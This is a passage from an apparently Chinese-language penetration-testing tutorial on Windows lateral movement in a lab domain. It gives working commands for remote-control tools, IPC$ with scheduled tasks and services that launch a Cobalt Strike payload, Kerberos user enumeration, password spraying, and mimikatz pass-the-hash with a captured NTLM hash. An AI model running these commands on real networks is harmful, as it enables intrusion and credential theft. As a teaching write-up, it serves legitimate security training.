title="GoToHTTP使用"></a>GoToHTTP使用</h3><p>使用cs或者其他工具将文件上传到目标机器</p><p>运行该文件</p><p><img src="/img/image-20231016111421321.png" alt="image-20231016111421321"></p><p>在运行目录下会生成一个配置文件</p><p><img src="/img/image-20231016111443684.png" alt="image-20231016111443684"></p><p><img src="/img/image-20231016111505652.png" alt="image-20231016111505652"></p><p>直接在指定的网站输入账号密码即可远控连接</p><img src="/img/image-20231016111627427.png" alt="image-20231016111627427" style="zoom:80%;" /><h2 id="4-利用RustDESK横向移动"><a href="#4-利用RustDESK横向移动" class="headerlink" title="4 利用RustDESK横向移动"></a>4 利用RustDESK横向移动</h2><h3 id="RustDESK介绍"><a href="#RustDESK介绍" class="headerlink" title="RustDESK介绍"></a>RustDESK介绍</h3><p>远程桌面软件，开箱即用，无需任何配置，完美替代TeamViewer。您完全掌控数据，不用担心安全问题。您可以 使用我们的注册&#x2F;中继服务器，或者自己设置，亦或者开发您的版本。</p><p><a href="https://gitee.com/rustdesk/rustdesk/releases">https://gitee.com/rustdesk/rustdesk/releases</a></p><h3 id="RustDESK安装"><a href="#RustDESK安装" class="headerlink" title="RustDESK安装"></a>RustDESK安装</h3><p>上传到目标机器</p><p><img src="/img/image-20231017100421823.png" alt="image-20231017100421823"></p><p>运行程序</p><img src="/img/image-20231017100528021.png" alt="image-20231017100528021" style="zoom:80%;" /><p>找到配置文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">目录：<span class="hljs-name">C</span>:\Users\administrator\AppData\Roaming\RustDesk\config<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017100654050.png" alt="image-20231017100654050"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">shell <span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\administrator\AppData\Roaming\RustDesk\config\RustDesk.toml<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017100751220.png" alt="image-20231017100751220"></p><p>可以看到没有密码，这个时候需要手写这个密码，替换配置文件，然后重启工具</p><p><img src="/img/image-20231017101048721.png" alt="image-20231017101048721"></p><p><img src="/img/image-20231017101243837.png" alt="image-20231017101243837"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">tasklist<br>taskkill <span class="hljs-regexp">/pid 2184 /</span>F<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017101318986.png" alt="image-20231017101318986"></p><p>此时密码已经被修改</p><p><img src="/img/image-20231017101632999.png" alt="image-20231017101632999"></p><p>远程连接</p><img src="/img/image-20231017101824862.png" alt="image-20231017101824862" style="zoom:80%;" /><h2 id="5-IPC配合计划任务横向移动"><a href="#5-IPC配合计划任务横向移动" class="headerlink" title="5 IPC配合计划任务横向移动"></a>5 IPC配合计划任务横向移动</h2><h3 id="IPC-介绍"><a href="#IPC-介绍" class="headerlink" title="IPC$介绍"></a>IPC$介绍</h3><p>IPC( Internet ProcessConnection)共享“命名管道”的资源,是为了实现进程间通信而开放的命名管道。 IPC可以<strong>通过验证用户名和密码获得相应的权限</strong>,通常在远程管理计算机和查看计算机的共享资源时使用。 </p><p>通过ipc$,可以与目标机器建立连接。利用这个连接,不仅可以访问目标机器中的文件,进行上传、下载等 操作,还可以在目标机器上运行其他命令,以获取目标机器的目录结构、用户列 表等信息。 首先,需要建立一个ipc$</p><p>首先,需要建立一个ipc$</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.210.100.30\ipc$ <span class="hljs-string">&quot;密码&quot;</span> /user:administrator<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017104928307.png" alt="image-20231017104928307"></p><h3 id="IPC-利用条件"><a href="#IPC-利用条件" class="headerlink" title="IPC$利用条件"></a>IPC$利用条件</h3><p>1、开启了139、445端口 ipcs可以实现远程登录及对默认共享资源的访问,而139端口的开启表示NetBIOS协议的应 用。通过 139、445( Windows2000)端口,可以实现对共享文件打印机的访问。因此,一般来讲,ipcs需要139、445 端口的支持。 </p><p>2、管理员开启了默认共享 默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$等和系统目录 winnt或 windows( adminS)通过ipc$,可以实现对这些默认共享目录的访问</p><h3 id="IPC-连接失败原因"><a href="#IPC-连接失败原因" class="headerlink" title="IPC$连接失败原因"></a>IPC$连接失败原因</h3><p>用户名或密码错误</p><p>目标没有打开ipcs默认共享 </p><p>不能成功连接目标的139、445端口</p><h3 id="IPC-连接常见错误"><a href="#IPC-连接常见错误" class="headerlink" title="IPC$连接常见错误"></a>IPC$连接常见错误</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">错误号5:拒绝访问</span><br><span class="hljs-section">错误号51: Windows无法找到网络路径,即网络中存在问题。</span><br><span class="hljs-section">错误号53:找不到网络路径,包括IP地址错误、目标未开机、目标的 lanmanserver服务未 启动目标有防火</span><br>墙(端口过滤)<br><span class="hljs-section">错误号67:找不到网络名,包括 lanmanworkstation服务未启动、ipcs已被删除</span><br><span class="hljs-section">错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipcs,需要在删除原连接后重新进</span><br>行连接。<br><span class="hljs-section">错误号1326:未知的用户名或错误的密码</span><br>错误号l792;试图登录,但是网络登录服务没有启动,包括目标NetLogon服务未启动（连 接域控制器时会出<br>现此情况）。<br><span class="hljs-section">错误号2242:此用户的密码已经过期°例如’目标机器设置了账号管理策略,强制用户定 期修改密码°</span><br></code></pre></td></tr></table></figure><h3 id="小tip"><a href="#小tip" class="headerlink" title="小tip"></a><strong>小tip</strong></h3><p>一个用户r1cky加入了本地的administrator组，仍然有uac认证</p><p><img src="/img/image-20231017110317789.png" alt="image-20231017110317789"></p><p><img src="/img/image-20231017110543181.png" alt="image-20231017110543181"></p><p>有uac认证时抓取不了密码  通过CS提权脚本就可以绕过，也可以通过先提权到system用户。然后加一个用户到administrator组中，然后再提权绕过uac，也可以远控然后手动添加，如果不出网，就建立隧道。</p><h3 id="利用方式-windows自带命令"><a href="#利用方式-windows自带命令" class="headerlink" title="利用方式-windows自带命令"></a>利用方式-windows自带命令</h3><h4 id="dir命令"><a href="#dir命令" class="headerlink" title="dir命令"></a>dir命令</h4><p>在使用 netuse命令与远程目标机器建立ipcs后,可以使用dir命令列出远程主机中的文件, 如图</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">10.210.100.30</span>\c$<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017112241996.png" alt="image-20231017112241996"></p><h4 id="tasklist命令"><a href="#tasklist命令" class="headerlink" title="tasklist命令"></a>tasklist命令</h4><p>在使用 net use命令与远程目标机器建立ipcs后,可以使用 tasklist命令的&#x2F;S、&#x2F;U &#x2F;P参数列 出远程主机上运行的进程</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tasklist</span> /s <span class="hljs-number">10.210.100.30</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017112652765.png" alt="image-20231017112652765"></p><h3 id="利用方式-schtasks（计划任务）"><a href="#利用方式-schtasks（计划任务）" class="headerlink" title="利用方式-schtasks（计划任务）"></a>利用方式-schtasks（计划任务）</h3><p>（1）查看系统时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> \\IP地址<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017112733114.png" alt="image-20231017112733114"></p><p>（2）复制文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> 文件 \\IP地址\C<span class="hljs-variable">$</span><br><span class="hljs-built_in">copy</span> C:\Users\Administrator\Desktop\artifact.exe \\<span class="hljs-number">10.210</span>.<span class="hljs-number">100.30</span>\C<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017113748792.png" alt="image-20231017113748792"></p><p>（3）创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f<br>schtasks /create /s 10.210.100.30 /tn r1cky /sc onstart /tr c:\artifact.exe /ru system /f<br>可能不成功，加上账号密码<br>schtasks /create /u administrator /p Ar1cky /s 10.210.100.30 /tn r1cky /sc onstart /tr c:\artifact.exe /ru system /f    winserver2003执行失败<br></code></pre></td></tr></table></figure><p>（4）执行计划任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s IP地址 <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;计划任务名&quot;</span><br>schtasks <span class="hljs-regexp">/run /</span>s <span class="hljs-number">10.210</span>.<span class="hljs-number">100.30</span> <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;r1cky&quot;</span><br>schtasks <span class="hljs-regexp">/run /u</span> administrator <span class="hljs-regexp">/p Ar1cky /</span>s <span class="hljs-number">10.210</span>.<span class="hljs-number">100.30</span> <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;r1cky&quot;</span><br></code></pre></td></tr></table></figure><p>（5）删除计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /delete /s IP地址 /tn <span class="hljs-string">&quot;计划任务名&quot;</span> /f<br></code></pre></td></tr></table></figure><p>（6）清除IPC连接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">net use \\IP <span class="hljs-regexp">/del /y</span><br></code></pre></td></tr></table></figure><h2 id="6-IPC配合系统服务横向移动"><a href="#6-IPC配合系统服务横向移动" class="headerlink" title="6 IPC配合系统服务横向移动"></a>6 IPC配合系统服务横向移动</h2><h3 id="SC命令详解"><a href="#SC命令详解" class="headerlink" title="SC命令详解"></a>SC命令详解</h3><p>获取到密码并着手横向时，却发现Task Sheduler服务没有启用。这时候我们就可以远程建立服务，然后再启用服务来运行我们想要运行的命令。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs sql">描述:SC 是用来与服务控制管理器和服务进行通信的命令行程序。<br>用法:sc <span class="hljs-operator">&lt;</span>server<span class="hljs-operator">&gt;</span> [command] [service name] <span class="hljs-operator">&lt;</span>option1<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>option2<span class="hljs-operator">&gt;</span>...<br><span class="hljs-operator">&lt;</span>server<span class="hljs-operator">&gt;</span> 选项的格式为 &quot;\\ServerName&quot;可通过键入以下命令获取有关命令的更多帮助: &quot;sc<br>[command]&quot;<br>命令:<br>query<span class="hljs-comment">-----------查询服务的状态，或枚举服务类型的状态。</span><br>queryex<span class="hljs-comment">---------查询服务的扩展状态，或枚举服务类型的状态。</span><br><span class="hljs-keyword">start</span><span class="hljs-comment">-----------启动服务。</span><br>pause<span class="hljs-comment">-----------向服务发送 PAUSE 控制请求。</span><br>interrogate<span class="hljs-comment">-----向服务发送 INTERROGATE 控制请求。</span><br>continue<span class="hljs-comment">--------向服务发送 CONTINUE 控制请求。</span><br>stop<span class="hljs-comment">------------向服务发送 STOP 请求。</span><br>config<span class="hljs-comment">----------更改服务的配置(永久)。</span><br>description<span class="hljs-comment">-----更改服务的描述。</span><br>failure<span class="hljs-comment">---------更改失败时服务执行的操作。</span><br>failureflag<span class="hljs-comment">-----更改服务的失败操作标志。</span><br>sidtype<span class="hljs-comment">---------更改服务的服务 SID 类型。</span><br>privs<span class="hljs-comment">-----------更改服务的所需特权。</span><br>managedaccount<span class="hljs-comment">--更改服务以将服务帐户密码标记为由 LSA 管理。</span><br>qc<span class="hljs-comment">--------------查询服务的配置信息。</span><br>qdescription<span class="hljs-comment">----查询服务的描述。</span><br>qfailure<span class="hljs-comment">--------查询失败时服务执行的操作。</span><br>qfailureflag<span class="hljs-comment">----查询服务的失败操作标志。</span><br>qsidtype<span class="hljs-comment">--------查询服务的服务 SID 类型。</span><br>qprivs<span class="hljs-comment">----------查询服务的所需特权。</span><br>qtriggerinfo<span class="hljs-comment">----查询服务的触发器参数。</span><br>qpreferrednode<span class="hljs-comment">--查询服务的首选 NUMA 节点。</span><br>qmanagedaccount<span class="hljs-operator">-</span>查询服务是否将帐户与 LSA 管理的密码结合使用。<br>qprotection<span class="hljs-comment">-----查询服务的进程保护级别。</span><br>quserservice<span class="hljs-comment">----查询用户服务模板的本地实例。</span><br><span class="hljs-keyword">delete</span> <span class="hljs-comment">----------(从注册表中)删除服务。</span><br><span class="hljs-keyword">create</span><span class="hljs-comment">----------创建服务(并将其添加到注册表中)。</span><br>control<span class="hljs-comment">---------向服务发送控制。</span><br>sdshow<span class="hljs-comment">----------显示服务的安全描述符。</span><br>sdset<span class="hljs-comment">-----------设置服务的安全描述符。</span><br>showsid<span class="hljs-comment">---------显示与任意名称对应的服务 SID 字符串。</span><br>triggerinfo<span class="hljs-comment">-----配置服务的触发器参数。</span><br>preferrednode<span class="hljs-comment">---设置服务的首选 NUMA 节点。</span><br>GetDisplayName<span class="hljs-comment">--获取服务的 DisplayName。</span><br>GetKeyName<span class="hljs-comment">------获取服务的 ServiceKeyName。</span><br>EnumDepend<span class="hljs-comment">------枚举服务依赖关系</span><br></code></pre></td></tr></table></figure><h3 id="使用sc横向"><a href="#使用sc横向" class="headerlink" title="使用sc横向"></a>使用sc横向</h3><p>IPC建立连接</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.210.100.30\ipc$ <span class="hljs-string">&quot;密码&quot;</span> /user:administrator<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017115159106.png" alt="image-20231017115159106"></p><p>复制文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">copy C:<span class="hljs-string">\Users\Administrator\Desktop\artifact.exe</span> <span class="hljs-string">\\10.210.100.30\C$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017115339967.png" alt="image-20231017115339967"></p><p>创建服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">210</span>.<span class="hljs-number">100</span>.<span class="hljs-number">30</span> create test <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;cmd.exe /c c:\artifact.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017115442169.png" alt="image-20231017115442169"></p><p>开启服务</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sc</span> \\<span class="hljs-number">10.210.100.30</span> start test<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017115532935.png" alt="image-20231017115532935"></p><p>机器上线</p><p><img src="/img/image-20231017115519238.png" alt="image-20231017115519238"></p><p><img src="/img/image-20231017115656279.png" alt="image-20231017115656279"></p><p>删除服务</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\10.210.100.30</span> <span class="hljs-keyword">delete</span> test<br></code></pre></td></tr></table></figure><h2 id="7-Password-Spraying密码喷洒攻击和域内用-户枚举横向移动"><a href="#7-Password-Spraying密码喷洒攻击和域内用-户枚举横向移动" class="headerlink" title="7 Password Spraying密码喷洒攻击和域内用 户枚举横向移动"></a>7 Password Spraying密码喷洒攻击和域内用 户枚举横向移动</h2><h3 id="域内用户枚举攻击原理"><a href="#域内用户枚举攻击原理" class="headerlink" title="域内用户枚举攻击原理"></a>域内用户枚举攻击原理</h3><p>正常域用户登录主机，我们可以通过 “net user &#x2F;domain”来列举出域内的用户。但是当我们用<strong>非域用户进行登录</strong>时，是不能使用 “net user &#x2F;domain”这条命令的。或者当主<strong>机不在域内但是能与域控通信时</strong>， 以上两种情况我们可以通过以下方法对域内用户进行枚举。</p><p>Kerberos本身是一种基于身份认证的协议，在 Kerberos 协议认证的 <strong>第一阶段</strong>AS-REQ ，<strong>当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP的返回包不一样</strong>。</p><p>所以可以利用这点，对域内进行域用户枚举和密码喷洒攻击。在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样，所以，根据AS的返回包来对域用户进行枚举</p><p><img src="/img/image-20231017143354610.png" alt="image-20231017143354610"></p><h3 id="枚举工具介绍"><a href="#枚举工具介绍" class="headerlink" title="枚举工具介绍"></a>枚举工具介绍</h3><h4 id="kerbrute工具"><a href="#kerbrute工具" class="headerlink" title="kerbrute工具"></a>kerbrute工具</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute<span class="hljs-selector-class">.exe</span> userenum <span class="hljs-attr">--dc</span> 域控ip -d 域名 用户名字典<span class="hljs-selector-class">.txt</span><br>kerbrute<span class="hljs-selector-class">.exe</span> userenum <span class="hljs-attr">--dc</span> <span class="hljs-number">10.210</span>.<span class="hljs-number">100.10</span> -d hack<span class="hljs-selector-class">.com</span> <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017145637353.png" alt="image-20231017145637353"> </p><h3 id="密码喷洒攻击原理"><a href="#密码喷洒攻击原理" class="headerlink" title="密码喷洒攻击原理"></a>密码喷洒攻击原理</h3><p>在确认用户存在后，客户端又会发送一个AS-REQ请求，如果密码正确，则返回AS-REP。否则返回 KRB5KDC_ERP_PREAUTH_FAILED</p><p>在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而<strong>密码喷洒就是先用一个密码去碰撞很多账号</strong>，此方法能有效的避免账号被锁定的问题</p><h4 id="kerbrute工具-1"><a href="#kerbrute工具-1" class="headerlink" title="kerbrute工具"></a>kerbrute工具</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute<span class="hljs-selector-class">.exe</span> passwordspray -d hack<span class="hljs-selector-class">.com</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> Admin123<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017150156183.png" alt="image-20231017150156183"> </p><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>CrackMapExec（⼜名 CME）是⼀款⾮常好⽤的密码喷洒攻击的⼯具，在 Kali Linux 默认已经安装好。 </p><p>下载地址： <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">10.210.100.10</span> -u <span class="hljs-number">1</span>.txt -p &#x27;Admin@<span class="hljs-number">123</span>&#x27; --continue-<span class="hljs-literal">on</span>-success<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017151111498.png" alt="image-20231017151111498"></p><h4 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h4><p>必须是域内用户或者system才可以</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">UserList：用户字典<br>Password：单个密码<br>PasswordList：密码字典<br><span class="hljs-keyword">OutFile</span>：输出的文件名<br>Domain：要爆破的域<br><span class="hljs-literal">Force</span>：强制喷洒继续，而不提示确认<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.<span class="hljs-keyword">cs</span>远控靶机执行<br>Import-Module .\DomainPasswordSpray.ps1<br>Invoke-DomainPasswordSpray -UserList <span class="hljs-number">1</span>.txt -Domain hack.<span class="hljs-keyword">com</span> -Password Admin@<span class="hljs-number">123</span> -Force -OutFile <span class="hljs-keyword">res</span>.txt<br><span class="hljs-number">2</span>.<span class="hljs-keyword">cs</span>提到<span class="hljs-built_in">system</span>执行：<br><span class="hljs-keyword">shell</span> powershell.<span class="hljs-keyword">exe</span> -exec bypass -<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;&amp; &#123; import-module C:\Users\Administrator\Desktop\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -UserList C:\Users\Administrator\Desktop\1.txt -Domain hack.com -Password Admin@123 -Force -OutFile C:\Users\Administrator\Desktop\res.txt&#125;&quot;</span><br><span class="hljs-number">3</span>.远程执行<br><span class="hljs-number">4</span>.攻击机<span class="hljs-keyword">cs</span>执行  文件放在攻击机本地<br>powershell DomainPasswordSpray.ps1<br>powershell Invoke-DomainPasswordSpray -UserList C:\Users\Administrator\Desktop\<span class="hljs-number">1</span>.txt -Domain hack.<span class="hljs-keyword">com</span> -Password Admin@<span class="hljs-number">123</span> -Force -OutFile C:\Users\Administrator\Desktop\<span class="hljs-keyword">res</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017154216091.png" alt="image-20231017154216091"></p><h2 id="8-Pass-the-Hash-哈希传递攻击-PTH-横向移动"><a href="#8-Pass-the-Hash-哈希传递攻击-PTH-横向移动" class="headerlink" title="8 Pass the Hash 哈希传递攻击(PTH)横向移动"></a>8 Pass the Hash 哈希传递攻击(PTH)横向移动</h2><h3 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h3><p>大多数渗透测试人员都听说过哈希传递(Pass The Hash)攻击。<strong>该方法通过找到与账户相关的密码散列值(通常是 NTLM Hash)来进行攻击</strong>。</p><p>在域环境中,用户登录计算机时使用的大都是域账号,大量计算机在安装时会使用相同的本地管理员账号和密码,因此,</p><p><strong>如果计算机的本地管理员账号和密码也是相同的,攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机</strong>。</p><p>同时,通过哈希传递攻击,攻击者不需要花时间破解密码散列值(进而获得密码明文)。 在Windows网络中,散列值就是用来证明身份的(有正确的用户名和密码散列值,就能通过验证),而微软自己的产品和工具显然不会支持这种攻击,于是,攻击者往往会使用第三方工具来完成任务。</p><p>在 WindowsServer2012R2及之后版本的操作系统中,默认在内存中不会记录明文密码,因此,攻击者往往会使用工具将散列值传递到其他计算机中,进行权限验证,实现对远程计算机的控制。</p><h3 id="哈希传递攻击原理"><a href="#哈希传递攻击原理" class="headerlink" title="哈希传递攻击原理"></a>哈希传递攻击原理</h3><p>当用户需要登录某网站时,如果该网站使用明文的方式保存用户的密码,那么,一旦该网站出现安全漏洞,所有用户的明 文密码均会被泄露。</p><p>由此,产生了散列值的概念。当用户设置密码时,网站服务器会对用户输 入的密码进行散列加密处理(通常使用MD5算法)散列加密算法般为单向不可逆算法。当用户登录网站时, 会先对用户输入的密码进行散列加密处理,再与数据 库中存储的散列值进行对比,如果完全相同则表示验证成功。 </p><p>主流的Windows操作系统,通常会使用 NTLM Hash对访问资源的用户进行身份验证。早期版本的 Windows操作系 统,则使用 LMHash对用户密码进行验证。但是,当密码大于等于14位 时,就无法使 用 LM Hash了。</p><p>从Windows vista和 Windowsserver2008版本开始, Windows操作系统默认禁用 LM Hash,因为在使用 NTLM Hash进行身份认 证时,不会使用明文口令,而是将明文口令通过系统API(例如 Lsalogon User)转换成散列值。不过,攻击者在获得密码散列值之 后,依旧可以使用哈希传递攻击来模拟用户进行认证。</p><h3 id="哈希传递条件"><a href="#哈希传递条件" class="headerlink" title="哈希传递条件"></a>哈希传递条件</h3><p>哈希传递攻击的前提：<strong>有管理员的 NTLM Hash ，并且目标机器开放445端口</strong>。</p><p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p><p>Windows Vista 之后的机器，只能是administrator(SID为500)用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问 </p><p>在工作组环境中： Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。 Windows Vista之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。 </p><p>在域环境中： <strong>只能是域管理员组内用户</strong>(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器</p><h3 id="哈希传递实验"><a href="#哈希传递实验" class="headerlink" title="哈希传递实验"></a>哈希传递实验</h3><p>实验环境如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.210.100.30</span> 机器是admin用户进行登录 （本地管理员）<br><span class="hljs-number">10.210.100.20</span> 机器是administrator登录 （本地管理员）<br>两台机器的administrator administrator用户账号密码相同<br></code></pre></td></tr></table></figure><p>10.210.100.30 admin用户上线，且绕过了uac</p><p><img src="/img/image-20231017172234423.png" alt="image-20231017172234423"> </p><p>run mimikatz 抓取密码  获得administrator密码的ntlm hash：e45a314c664d40a227f9540121d1a29d</p><p><img src="/img/image-20231017172107776.png" alt="image-20231017172107776"> </p><p>目前使用dir不能访问20机器</p><p><img src="/img/image-20231017172153867.png" alt="image-20231017172153867"> </p><p>使用mimikatz进行hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:10.210.100.20 /ntlm:e45a314c664d40a227f9540121d1a29d&quot;</span><br><br>mimikatz sekurlsa::pth /user:administrator /domain:10.210.100.20 /ntlm:e45a314c664d40a227f9540121d1a29d<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231017172712446.png" alt="image-20231017172712446"></p><p>认证成功之后，.30会弹出一个cmd窗口，这里可以执行命令访问.20,但在cs里应该执行不成功</p><p><img src="/img/image-20231017173157730.png" alt="image-20231017173157730"> </p><p><img src="/img/image-20231017173249429.png" alt="image-20231017173249429"> </p><p>此时可以通过IPC配合计划任务或者系统服务横向</p><p>方式一：通过IPC配合计划任务横向</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-number">1</span>.复制木马文件<br><span class="hljs-keyword">copy</span> C:\Users\Administrator\Desktop\artifact.exe \\<span class="hljs-number">10.210</span>.<span class="hljs-number">100.20</span>\C$<br><span class="hljs-number">2</span>.创建计划任务<br>schtasks <span class="hljs-regexp">/create /</span>s <span 